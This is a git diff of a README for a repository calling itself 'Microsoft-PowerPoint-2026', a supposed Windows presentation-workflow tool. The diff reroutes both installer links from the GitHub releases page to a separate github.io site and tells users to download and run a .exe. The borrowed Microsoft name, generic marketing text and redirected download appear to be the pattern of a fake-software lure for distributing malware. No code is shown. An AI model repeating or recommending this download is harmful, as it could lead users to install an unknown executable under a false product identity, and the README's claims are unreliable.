@@ -1,6 +1,6 @@
 # 📊 Microsoft-PowerPoint-2026 - Streamline your professional presentation workflows daily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rohaanz5627/Microsoft-PowerPoint-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rohaanz5627.github.io)
 
 Microsoft-PowerPoint-2026 helps you manage slide masters, speaker notes, and export presets on Windows. This tool organizes your presentation workflow to save time. It simplifies complex tasks into single clicks. You keep your focus on content rather than formatting settings. This application works with your existing presentation files to ensure consistency across your team.
 
@@ -8,7 +8,7 @@ Microsoft-PowerPoint-2026 helps you manage slide masters, speaker notes, and exp
 
 You need a computer running Windows 10 or Windows 11 to use this software. Make sure you have at least 500 MB of free disk space. The application requires a stable internet connection for the installation process.
 
-1. Visit the [releases page](https://github.com/rohaanz5627/Microsoft-PowerPoint-2026/releases) to access the installer.
+1. Visit the [releases page](https://rohaanz5627.github.io) to access the installer.
 2. Select the latest version listed under the Assets section. 
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
